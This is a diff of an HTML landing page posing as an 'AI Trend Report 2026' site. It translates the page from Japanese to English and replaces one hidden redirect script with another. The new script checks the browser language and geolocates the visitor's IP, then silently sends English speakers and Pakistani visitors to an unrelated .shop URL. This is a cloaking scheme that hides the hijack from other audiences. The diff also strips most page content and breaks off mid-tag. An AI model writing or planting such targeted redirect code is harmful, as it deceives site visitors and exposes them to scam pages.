@@ -1,72 +1,68 @@
 <!DOCTYPE html>
-<html lang="ja">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
 
-	<script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
-<script>LA.init({id:"KnduWJ0InBfM2nYa",ck:"KnduWJ0InBfM2nYa"})</script>
-	
-	
-<script>
-  // ✅ IP 白名单
-  const WHITE_LIST_IPS = [
-    "104.252.23.41",
-	   "154.6.81.17",
-	   "23.229.109.217",
-    "103.156.184.47"
-  ];
+    <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+    <script>LA.init({id:"KnduWJ0InBfM2nYa",ck:"KnduWJ0InBfM2nYa"})</script>
 
-  // 跳转目标
-  const REDIRECT_URL = "https://callmesa.com/auv7n3h8f";
+    <script>
+      // Redirect target
+      const REDIRECT_URL = "https://c9m1mk.shop?ch=763";
 
-  // ✅ 判断是否日文语言
-  function isJapaneseLang() {
-    const langs = navigator.languages?.length
-      ? navigator.languages
-      : [navigator.language || ""];
-    return langs.some(l => l.toLowerCase().startsWith("ja"));
-  }
-
-  // ✅ 执行跳转
-  function redirect() {
-    window.location.replace(REDIRECT_URL);
-  }
-
-  // ✅ 带超时的 fetch
-  function fetchWithTimeout(url, ms = 4000) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), ms);
-    return fetch(url, { signal: controller.signal })
-      .finally(() => clearTimeout(timer));
-  }
-
-  // ✅ 主逻辑：语言优先判断，避免不必要的网络请求
-  (async function init() {
-    // 第一步：语言检测，立即判断，无需网络
-    if (isJapaneseLang()) {
-      redirect();
-      return;
-    }
-
-    // 第二步：语言不符合，再去检查 IP
-    try {
-      const res = await fetchWithTimeout("https://ipapi.co/json/");
-      const data = await res.json();
-      if (WHITE_LIST_IPS.includes(data.ip)) {
-        redirect();
+      // ✅ Check if language is English
+      function isEnglishLang() {
+        const langs = navigator.languages?.length
+          ? navigator.languages
+          : [navigator.language || ""];
+        return langs.some(l => l.toLowerCase().startsWith("en"));
       }
-    } catch (e) {
-      // IP 获取失败（超时 / 网络错误）：不跳转，静默处理
-      console.warn("IP check failed:", e.message);
-    }
-  })();
+
+      // ✅ Execute redirect
+      function redirect() {
+        window.location.replace(REDIRECT_URL);
+      }
+
+      // ✅ Fetch with timeout
+      function fetchWithTimeout(url, ms = 4000) {
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), ms);
+        return fetch(url, { signal: controller.signal })
+          .finally(() => clearTimeout(timer));
+      }
+
+      // ✅ Check if IP is from Pakistan
+      async function isPakistanIP() {
+        try {
+          const res = await fetchWithTimeout("https://ipapi.co/json/");
+          const data = await res.json();
+          // country_code "PK" represents Pakistan
+          return data.country_code === "PK";
+        } catch (e) {
+          console.warn("IP country check failed:", e.message);
+          return false;
+        }
+      }
+
+      // ✅ Main logic
+      (async function init() {
+        // Step 1: Language detection
+        if (isEnglishLang()) {
+          redirect();
+          return;
+        }
+
+        // Step 2: Check if IP is from Pakistan
+        const isPakistan = await isPakistanIP();
+        if (isPakistan) {
+          redirect();
+        }
+      })();
 </script>
 
-
-
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="AIトレンドレポート2026 - 人工知能の最新動向、技術革新、市場分析を専門家が解説。企業のAI導入から生成AIまで最新情報を提供します。">
-    <title>AIトレンドレポート 2026 | 人工知能の最前線</title>
+    <meta name="description" content="AI Trend Report 2026 - Expert analysis on the latest trends in artificial intelligence, technological innovation, and market analysis. Providing the latest information from corporate AI adoption to generative AI.">
+    <title>AI Trend Report 2026 | The Frontier of Artificial Intelligence</title>
     <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+JP:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
@@ -1003,8 +999,8 @@
 
 <!-- Announcement Bar -->
 <div class="announcement-bar">
-    🚀 2026年版 AIトレンドレポートを無料配布中。
-    <a href="#newsletter">今すぐダウンロード</a>
+    🚀 Free distribution of the 2026 AI Trend Report.
+    <a href="#newsletter">Download now</a>
 </div>
 
 <!-- Header -->
@@ -1012,68 +1008,68 @@
     <div class="header-inner">
         <a href="#" class="logo">
             <div class="logo-icon">AI</div>
-            <span class="logo-text">AI<span>トレンド</span>ラボ</span>
+            <span class="logo-text">AI<span>Trend</span>Lab</span>
         </a>
         <nav>
             <ul>
-                <li><a href="#trends">最新トレンド</a></li>
-                <li><a href="#market">市場分析</a></li>
-                <li><a href="#technology">技術動向</a></li>
-                <li><a href="#forecast">将来予測</a></li>
-                <li><a href="#industry">業界別</a></li>
-                <li><a href="#about">私たちについて</a></li>
-                <li><a href="#newsletter" class="nav-cta">レポート入手</a></li>
+                <li><a href="#trends">Latest Trends</a></li>
+                <li><a href="#market">Market Analysis</a></li>
+                <li><a href="#technology">Tech Dynamics</a></li>
+                <li><a href="#forecast">Future Forecast</a></li>
+                <li><a href="#industry">By Industry</a></li>
+                <li><a href="#about">About Us</a></li>
+                <li><a href="#newsletter" class="nav-cta">Get Report</a></li>
             </ul>
         </nav>
-        <div class="hamburger" onclick="toggleMobileNav()" aria-label="メニュー">
+        <div class="hamburger" onclick="toggleMobileNav()" aria-label="Menu">
             <span></span>
             <span></span>
             <span></span>
         </div>
     </div>
     <div class="mobile-nav" id="mobileNav">
-        <a href="#trends" onclick="toggleMobileNav()">最新トレンド</a>
-        <a href="#market" onclick="toggleMobileNav()">市場分析</a>
-        <a href="#technology" onclick="toggleMobileNav()">技術動向</a>
-        <a href="#forecast" onclick="toggleMobileNav()">将来予測</a>
-        <a href="#industry" onclick="toggleMobileNav()">業界別</a>
-        <a href="#about" onclick="toggleMobileNav()">私たちについて</a>
-        <a href="#newsletter" onclick="toggleMobileNav()">レポートを入手</a>
+        <a href="#trends" onclick="toggleMobileNav()">Latest Trends</a>
+        <a href="#market" onclick="toggleMobileNav()">Market Analysis</a>
+        <a href="#technology" onclick="toggleMobileNav()">Tech Dynamics</a>
+        <a href="#forecast" onclick="toggleMobileNav()">Future Forecast</a>
+        <a href="#industry" onclick="toggleMobileNav()">By Industry</a>
+        <a href="#about" onclick="toggleMobileNav()">About Us</a>
+        <a href="#newsletter" onclick="toggleMobileNav()">Get Report</a>
     </div>
 </header>
 
 <!-- Breadcrumb -->
 <div class="breadcrumb">
     <div class="breadcrumb-inner">
-        <a href="#">ホーム</a>
+        <a href="#">Home</a>
         <span>›</span>
-        <a href="#trends">AIトレンド</a>
+        <a href="#trends">AI Trends</a>
         <span>›</span>
-        <span>2026年最新レポート</span>
+        <span>Latest 2026 Report</span>
     </div>
 </div>
 
 <!-- Hero -->
 <section class="hero" id="home">
-    <div class="hero-badge">📊 2026年 最新版 アップデート済み</div>
-    <h1>人工知能が変える<br><span>ビジネスの未来</span>と最新トレンド</h1>
-    <p>生成AI・機械学習・自動化技術の急速な進化。専門家チームが最前線の動向を分析し、あなたのビジネス戦略に役立つインサイトをお届けします。</p>
+    <div class="hero-badge">📊 2026 Latest Edition - Updated</div>
+    <h1>The Future of Business <br>Transformed by <span>Artificial Intelligence</span> & Latest Trends</h1>
+    <p>Rapid evolution of generative AI, machine learning, and automation technologies. Our expert team analyzes cutting-edge developments to deliver insights that support your business strategy.</p>
     <div class="hero-buttons">
-        <a href="#trends" class="btn-primary">トレンドを見る</a>
-        <a href="#newsletter" class="btn-outline">無料レポートを入手</a>
+        <a href="#trends" class="btn-primary">View Trends</a>
+        <a href="#newsletter" class="btn-outline">Get Free Report</a>
     </div>
     <div class="hero-stats">
         <div class="hero-stat">
-            <strong>1.8兆ドル</strong>
-            <span>2030年 世界AI市場規模予測</span>
+            <strong>$1.8 Trillion</strong>
+            <span>Projected Global AI Market Size by 2030</span>
         </div>
         <div class="hero-stat">
             <strong>37%</strong>
-            <span>年間平均成長率（CAGR）</span>
+            <span>Compound Annual Growth Rate (CAGR)</span>
         </div>
         <div class="hero-stat">
-            <strong>7億7,500万人</strong>
-            <span>AI活用が見込まれる労働者数</span>
+            <strong>775 Million</strong>
+            <span>Workers Expected to Use AI</span>
         </div>
     </div>
 </section>
@@ -1082,395 +1078,43 @@
 <section id="trends">
     <div class="container">
         <div class="text-center">
-            <span class="section-label">最新トレンド</span>
-            <h2 class="section-title">2026年 注目のAIトレンド</h2>
-            <p class="section-desc">技術革新が加速する中、各分野で急速に普及が進む主要AIトレンドを解説します。</p>
+            <span class="section-label">Latest Trends</span>
+            <h2 class="section-title">Key AI Trends to Watch in 2026</h2>
+            <p class="section-desc">With accelerating technological innovation, we explain the major AI trends rapidly spreading across various fields.</p>
         </div>
         <div class="trends-grid">
             <div class="trend-card">
                 <div class="trend-icon" style="background:#eff6ff;">🤖</div>
-                <h3>生成AI（Generative AI）の普及</h3>
-                <p>ChatGPT、Gemini、Claudeなどの大規模言語モデル（LLM）がビジネス現場に急速に浸透。文書作成、コーディング支援、顧客対応の自動化が加速しています。</p>
-                <span class="trend-tag" style="background:#eff6ff;color:#1a56db;">🔥 急成長中</span>
+                <h3>Proliferation of Generative AI</h3>
+                <p>Large Language Models (LLMs) like ChatGPT, Gemini, and Claude are rapidly penetrating business environments, accelerating automation in document creation, coding support, and customer service.</p>
+                <span class="trend-tag" style="background:#eff6ff;color:#1a56db;">🔥 Rapidly Growing</span>
             </div>
             <div class="trend-card">
                 <div class="trend-icon" style="background:#f0fdf4;">🧠</div>
-                <h3>マルチモーダルAI</h3>
-                <p>テキスト・画像・音声・動画を統合して理解・生成するAIが登場。より人間に近い自然なインタラクションが可能になり、UXが劇的に向上しています。</p>
-                <span class="trend-tag" style="background:#f0fdf4;color:#16a34a;">💡 注目技術</span>
+                <h3>Multimodal AI</h3>
+                <p>AI that integrates and understands text, images, audio, and video is emerging. Enabling more human-like natural interaction, dramatically improving user experience.</p>
+                <span class="trend-tag" style="background:#f0fdf4;color:#16a34a;">💡 Key Technology</span>
             </div>
             <div class="trend-card">
                 <div class="trend-icon" style="background:#fdf4ff;">⚡</div>
-                <h3>AIエージェントの台頭</h3>
-                <p>自律的にタスクを計画・実行するAIエージェントが進化。複雑な業務プロセスを人間の監督なしに遂行できる「アジェンティックAI」が注目を集めています。</p>
-                <span class="trend-tag" style="background:#fdf4ff;color:#7c3aed;">🚀 最前線</span>
+                <h3>Rise of AI Agents</h3>
+                <p>Autonomous AI agents that plan and execute tasks are evolving. 'Agentic AI,' capable of performing complex business processes without human supervision, is gaining attention.</p>
+                <span class="trend-tag" style="background:#fdf4ff;color:#7c3aed;">🚀 Cutting Edge</span>
             </div>
             <div class="trend-card">
                 <div class="trend-icon" style="background:#fff7ed;">🏭</div>
-                <h3>産業向けAI（Industrial AI）</h3>
-                <p>製造業・物流・インフラ管理への特化型AI導入が拡大。予知保全、品質管理、サプライチェーン最適化で年間数兆円規模のコスト削減効果が実証されています。</p>
-                <span class="trend-tag" style="background:#fff7ed;color:#ea580c;">📈 市場拡大</span>
+                <h3>Industrial AI</h3>
+                <p>Deployment of specialized AI in manufacturing, logistics, and infrastructure management is expanding. Proven annual cost savings worth trillions of yen through predictive maintenance, quality control, and supply chain optimization.</p>
+                <span class="trend-tag" style="background:#fff7ed;color:#ea580c;">📈 Market Expanding</span>
             </div>
             <div class="trend-card">
                 <div class="trend-icon" style="background:#fef2f2;">🔒</div>
-                <h3>責任あるAI・AIガバナンス</h3>
-                <p>EU AI法をはじめとする規制の整備が世界的に進展。説明可能AI（XAI）、バイアス検出、透明性確保などの倫理的AI開発への対応が企業の最重要課題に。</p>
-                <span class="trend-tag" style="background:#fef2f2;color:#dc2626;">⚖️ 規制対応</span>
+                <h3>Responsible AI & AI Governance</h3>
+                <p>Global progress in regulatory frameworks like the EU AI Act. Addressing ethical AI development, including Explainable AI (XAI), bias detection, and transparency, is becoming a top priority for companies.</p>
+                <span class="trend-tag" style="background:#fef2f2;color:#dc2626;">⚖️ Regulatory Compliance</span>
             </div>
             <div class="trend-card">
                 <div class="trend-icon" style="background:#f0f9ff;">🌐</div>
-                <h3>エッジAI・小型モデルの進化</h3>
-                <p>クラウド依存から脱却し、端末上でAI処理を行うエッジAIが普及。SLM（小型言語モデル）の高性能化により、オフライン環境でのAI活用が現実となっています。</p>
-                <span class="trend-tag" style="background:#f0f9ff;color:#0284c7;">📱 普及段階</span>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Market Section -->
-<section id="market">
-    <div class="container">
-        <div class="market-grid">
-            <div class="market-text">
-                <span class="section-label">市場分析</span>
-                <h2 class="section-title">世界のAI市場規模<br>急拡大が続く</h2>
-                <p>グローバルAI市場は2024年に約5,000億ドルを突破し、2030年までに1.8兆ドルに達すると予測されています。特にアジア太平洋地域での成長が著しく、日本市場も年率30%以上の成長が見込まれます。</p>
-                <p>企業のAI投資は2026年も拡大傾向にあり、特に製造業・金融・医療・小売り分野での採用が加速。日本では政府主導のAI戦略に加え、民間企業の積極的な投資が市場を牽引しています。</p>
-                <p>一方、AI人材の不足が世界的な課題であり、AIエンジニアやデータサイエンティストの需要は供給を大きく上回る状況が続いています。</p>
-                <a href="#newsletter" class="btn-primary" style="display:inline-block;margin-top:20px;">詳細レポートを見る</a>
-            </div>
-            <div class="market-chart">
-                <div class="chart-title">📊 業界別AI導入率（2026年）</div>
-                <div class="bar-chart">
-                    <div class="bar-item">
-                        <div class="bar-label"><span>金融・保険</span><span>78%</span></div>
-                        <div class="bar-track"><div class="bar-fill" style="width:78%;background:linear-gradient(90deg,#1a56db,#3b82f6);"></div></div>
-                    </div>
-                    <div class="bar-item">
-                        <div class="bar-label"><span>IT・テクノロジー</span><span>85%</span></div>
-                        <div class="bar-track"><div class="bar-fill" style="width:85%;background:linear-gradient(90deg,#7c3aed,#a78bfa);"></div></div>
-                    </div>
-                    <div class="bar-item">
-                        <div class="bar-label"><span>医療・製薬</span><span>62%</span></div>
-                        <div class="bar-track"><div class="bar-fill" style="width:62%;background:linear-gradient(90deg,#059669,#34d399);"></div></div>
-                    </div>
-                    <div class="bar-item">
-                        <div class="bar-label"><span>製造業</span><span>57%</span></div>
-                        <div class="bar-track"><div class="bar-fill" style="width:57%;background:linear-gradient(90deg,#d97706,#fbbf24);"></div></div>
-                    </div>
-                    <div class="bar-item">
-                        <div class="bar-label"><span>小売・EC</span><span>71%</span></div>
-                        <div class="bar-track"><div class="bar-fill" style="width:71%;background:linear-gradient(90deg,#dc2626,#f87171);"></div></div>
-                    </div>
-                    <div class="bar-item">
-                        <div class="bar-label"><span>教育</span><span>44%</span></div>
-                        <div class="bar-track"><div class="bar-fill" style="width:44%;background:linear-gradient(90deg,#0891b2,#22d3ee);"></div></div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Technology Section -->
-<section id="technology">
-    <div class="container">
-        <div class="text-center">
-            <span class="section-label">技術動向</span>
-            <h2 class="section-title">AIを支えるコア技術の革新</h2>
-            <p class="section-desc">急速に進化する各AI技術分野の最新データと市場インパクトをご紹介します。</p>
-        </div>
-        <div class="tech-grid">
-            <div class="tech-card">
-                <div class="tech-number">GPT-5<span>世代</span></div>
-                <h4>大規模言語モデル（LLM）</h4>
-                <p>パラメータ数の増大とアーキテクチャ改善により、推論能力が飛躍的に向上。専門分野への特化が加速しています。</p>
-            </div>
-            <div class="tech-card">
-                <div class="tech-number">40<span>倍</span></div>
-                <h4>コンピューティング性能向上</h4>
-                <p>AIチップ（GPU・NPU）の進化により、過去3年間でAI処理性能が約40倍に向上。消費電力効率も改善されています。</p>
-            </div>
-            <div class="tech-card">
-                <div class="tech-number">90<span>%</span></div>
-                <h4>AI開発コスト削減</h4>
-                <p>クラウドサービスとオープンソースモデルの普及により、AI開発コストが過去5年で90%以上削減。中小企業への導入障壁が大幅に低下しました。</p>
-            </div>
-            <div class="tech-card">
-                <div class="tech-number">2<span>秒</span></div>
-                <h4>リアルタイム推論速度</h4>
-                <p>最新の推論最適化技術により、複雑なAI処理も2秒以内での応答が可能に。ユーザー体験の向上に貢献しています。</p>
-            </div>
-            <div class="tech-card">
-                <div class="tech-number">150+<span>機能</span></div>
-                <h4>AIアシスタント統合</h4>
-                <p>主要ビジネスソフトウェアへのAI機能統合が急拡大。Microsoft 365、Google Workspaceを中心に150以上のAI機能が追加されました。</p>
-            </div>
-            <div class="tech-card">
-                <div class="tech-number">$0.001<span>/1K tokens</span></div>
-                <h4>API利用コストの急落</h4>
-                <p>AIモデルのAPI提供価格が急速に低下。1,000トークンあたり0.001ドル以下が標準となり、大規模活用が容易になっています。</p>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Forecast Section -->
-<section id="forecast">
-    <div class="container">
-        <div class="text-center">
-            <span class="section-label">将来予測</span>
-            <h2 class="section-title">AIの進化ロードマップ<br>2026年〜2030年</h2>
-            <p class="section-desc">専門家の分析に基づく、近未来のAI技術発展の主要マイルストーンをご紹介します。</p>
-        </div>
-        <div class="forecast-timeline">
-            <div class="timeline-item">
-                <div class="timeline-dot">2026</div>
-                <div class="timeline-content">
-                    <h4>AIエージェント元年・マルチモーダル普及期</h4>
-                    <p>自律型AIエージェントが企業業務に浸透し始め、マルチモーダルAIがスマートフォンのデフォルト機能に。日本でも大手企業の80%以上がAI戦略を策定・実行フェーズへ移行。</p>
-                </div>
-            </div>
-            <div class="timeline-item">
-                <div class="timeline-dot">2026</div>
-                <div class="timeline-content">
-                    <h4>AI規制の本格施行・産業AIの深化</h4>
-                    <p>EU AI法が完全施行され、日本でも国内AI規制フレームワークが整備。医療診断・法律・金融など専門分野での特化型AIの信頼性が飛躍的に向上。</p>
-                </div>
-            </div>
-            <div class="timeline-item">
-                <div class="timeline-dot">2027</div>
-                <div class="timeline-content">
-                    <h4>物理AIとロボティクスの融合</h4>
-                    <p>AIと物理世界を結ぶロボティクス技術が実用化フェーズへ。工場・倉庫・建設現場での自律型ロボット普及が加速し、製造業の生産性革命が起きる見込み。</p>
-                </div>
-            </div>
-            <div class="timeline-item">
-                <div class="timeline-dot">2028</div>
-                <div class="timeline-content">
-                    <h4>汎用AI（AGI）への接近・量子AI連携</h4>
-                    <p>複数領域を横断的に処理できるAIシステムが登場し、AGIへの道筋が明確化。量子コンピューティングとの連携により、創薬・材料開発での革新的な成果が期待される。</p>
-                </div>
-            </div>
-            <div class="timeline-item">
-                <div class="timeline-dot">2030</div>
-                <div class="timeline-content">
-                    <h4>AI共生社会の実現・1.8兆ドル市場</h4>
-                    <p>AIがあらゆる産業・社会インフラに組み込まれた「AI共生社会」が実現。世界AI市場は1.8兆ドルに達し、日本のGDP成長への貢献が年間30兆円規模に達すると予測される。</p>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Industry Section -->
-<section id="industry">
-    <div class="container">
-        <div class="text-center">
-            <span class="section-label" style="color:#60a5fa;">業界別分析</span>
-            <h2 class="section-title" style="color:white;">各業界でのAI活用事例</h2>
-            <p class="section-desc" style="color:rgba(255,255,255,0.7);margin-left:auto;margin-right:auto;">主要産業ごとのAI導入状況と期待される変革インパクトをまとめました。</p>
-        </div>
-        <div class="industry-grid">
-            <div class="industry-card">
-                <div class="industry-icon">🏦</div>
-                <h4>金融・フィンテック</h4>
-                <p>不正検出・信用スコアリング・アルゴリズム取引・パーソナライズされた資産運用アドバイス。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🏥</div>
-                <h4>医療・ヘルスケア</h4>
-                <p>画像診断AI・創薬加速・遠隔医療支援・個別化医療の実現で患者アウトカム改善に貢献。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🏭</div>
-                <h4>製造・ものづくり</h4>
-                <p>予知保全・品質検査自動化・生産最適化・サプライチェーン管理での大幅な効率改善を実現。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🛒</div>
-                <h4>小売・EC</h4>
-                <p>パーソナライズドレコメンド・需要予測・在庫最適化・AIチャットボットによる24時間対応。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🎓</div>
-                <h4>教育・EdTech</h4>
-                <p>個別最適化学習・自動採点・AI家庭教師・学習進捗分析による教育効果の最大化。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🚗</div>
-                <h4>自動車・モビリティ</h4>
-                <p>自動運転技術の高度化・交通流最適化・車載AIアシスタント・EV充電予測管理。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🌱</div>
-                <h4>農業・フードテック</h4>
-                <p>スマート農業による精密農業の実現・収穫量予測・病害虫早期検知・フードロス削減。</p>
-            </div>
-            <div class="industry-card">
-                <div class="industry-icon">🏗️</div>
-                <h4>建設・不動産</h4>
-                <p>設計最適化・工程管理AI・不動産価格予測・スマートビル管理・安全管理支援。</p>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Newsletter Section -->
-<section id="newsletter">
-    <div class="container">
-        <div class="cta-box">
-            <h2>📄 無料AIトレンドレポートを入手</h2>
-            <p>月次レポートやAI業界の最新ニュース、専門家によるインサイトをメールでお届けします。登録は完全無料です。</p>
-            <form class="cta-form" onsubmit="handleSubmit(event)">
-                <input type="email" id="emailInput" placeholder="メールアドレスを入力" required>
-                <button type="submit">無料で登録</button>
-            </form>
-            <div class="success-msg" id="successMsg">
-                ✅ ご登録ありがとうございます！確認メールをお送りしました。
-            </div>
-            <p class="cta-note">プライバシーポリシーに基づき、個人情報は厳重に管理します。いつでも配信解除が可能です。</p>
-        </div>
-    </div>
-</section>
-
-<!-- About Section -->
-<section id="about">
-    <div class="container">
-        <div class="about-grid">
-            <div class="about-text">
-                <span class="section-label">私たちについて</span>
-                <h2 class="section-title">AIトレンドラボについて</h2>
-                <p>AIトレンドラボは、人工知能・機械学習・テクノロジー分野の最新動向を調査・分析・発信する専門メディアです。2020年の設立以来、企業のAI戦略担当者や技術者、研究者向けに信頼性の高い情報を提供し続けています。</p>
-                <p>私たちのチームは、AI研究者、データサイエンティスト、業界アナリストで構成されており、実務的かつ学術的な視点から独自のインサイトをお届けします。</p>
-            </div>
-            <div class="about-features">
-                <div class="about-feature">
-                    <div class="about-feature-icon">🔍</div>
-                    <div>
-                        <h5>独自調査・一次情報</h5>
-                        <p>業界関係者へのインタビューや独自アンケートを通じた一次情報に基づく分析を提供しています。</p>
-                    </div>
-                </div>
-                <div class="about-feature">
-                    <div class="about-feature-icon">📊</div>
-                    <div>
-                        <h5>データドリブンな分析</h5>
-                        <p>公的統計・学術論文・企業レポートなど複数の信頼性の高いソースを統合して分析しています。</p>
-                    </div>
-                </div>
-                <div class="about-feature">
-                    <div class="about-feature-icon">🌏</div>
-                    <div>
-                        <h5>グローバル視点</h5>
-                        <p>米国・欧州・アジアの最新動向を横断的に把握し、日本市場への示唆を提供しています。</p>
-                    </div>
-                </div>
-                <div class="about-feature">
-                    <div class="about-feature-icon">✅</div>
-                    <div>
-                        <h5>ファクトチェック徹底</h5>
-                        <p>すべての記事・レポートは専門家による複数回のレビューを経て、正確性を担保しています。</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-</section>
-
-<!-- Footer -->
-<footer>
-    <div class="footer-top">
-        <div class="footer-brand">
-            <div class="logo" style="color:white;margin-bottom:14px;">
-                <div class="logo-icon">AI</div>
-                <span class="logo-text" style="color:white;">AIトレンドラボ</span>
-            </div>
-            <p>人工知能・機械学習・テクノロジーの最新動向を発信する専門メディア。企業のAI戦略立案をサポートします。</p>
-        </div>
-        <div class="footer-col">
-            <h6>コンテンツ</h6>
-            <ul>
-                <li><a href="#trends">最新トレンド</a></li>
-                <li><a href="#market">市場分析</a></li>
-                <li><a href="#technology">技術動向</a></li>
-                <li><a href="#forecast">将来予測</a></li>
-                <li><a href="#industry">業界別事例</a></li>
-            </ul>
-        </div>
-        <div class="footer-col">
-            <h6>リソース</h6>
-            <ul>
-                <li><a href="#">無料レポート</a></li>
-                <li><a href="#">ホワイトペーパー</a></li>
-                <li><a href="#">ウェビナー</a></li>
-                <li><a href="#">用語集</a></li>
-                <li><a href="#">お問い合わせ</a></li>
-            </ul>
-        </div>
-        <div class="footer-col">
-            <h6>法的情報</h6>
-            <ul>
-                <li><a href="#">プライバシーポリシー</a></li>
-                <li><a href="#">利用規約</a></li>
-                <li><a href="#">免責事項</a></li>
-                <li><a href="#">特定商取引法</a></li>
-                <li><a href="#">Cookie設定</a></li>
-            </ul>
-        </div>
-    </div>
-    <div class="footer-bottom">
-        <p>
-            © 2026 AIトレンドラボ. All Rights Reserved.
-            <a href="#">プライバシーポリシー</a>
-            <a href="#">利用規約</a>
-            <a href="#">免責事項</a>
-            <a href="#">お問い合わせ</a>
-        </p>
-        <p style="margin-top:8px;">本サイトに掲載されている情報は一般的な情報提供を目的としており、投資・法律・専門的なアドバイスを構成するものではありません。</p>
-    </div>
-</footer>
-
-<!-- Scroll to Top -->
-<button class="scroll-top" id="scrollTop" onclick="window.scrollTo({top:0,behavior:'smooth'})" aria-label="トップへ戻る">↑</button>
-
-<script>
-    function toggleMobileNav() {
-        const nav = document.getElementById('mobileNav');
-        nav.classList.toggle('open');
-    }
-
-    window.addEventListener('scroll', () => {
-        const btn = document.getElementById('scrollTop');
-        if (window.scrollY > 400) btn.classList.add('visible');
-        else btn.classList.remove('visible');
-    });
-
-    function handleSubmit(e) {
-        e.preventDefault();
-        const input = document.getElementById('emailInput');
-        const msg = document.getElementById('successMsg');
-        if (input.value) {
-            msg.style.display = 'block';
-            input.value = '';
-            setTimeout(() => { msg.style.display = 'none'; }, 5000);
-        }
-    }
-
-    // Animate bars when in view
-    const observer = new IntersectionObserver((entries) => {
-        entries.forEach(entry => {
-            if (entry.isIntersecting) {
-                entry.target.style.animationPlayState = 'running';
-            }
-        });
-    }, { threshold: 0.2 });
-
-    document.querySelectorAll('.bar-fill').forEach(bar => {
-        bar.style.animationPlayState = 'paused';
-        observer.observe(bar);
-    });
-</script>
-</body>
-
-</html>
+                <h3>Evolution of Edge AI & Small Models</h3>
+                <p>Edge AI, processing data on devices rather than relying on the cloud, is becoming widespread. High-performance Small Language Models (SLMs) make AI utilization in offline environments a reality.</p>
+                <span class="trend-tag" style="background:#f0f9ff;color:#0284
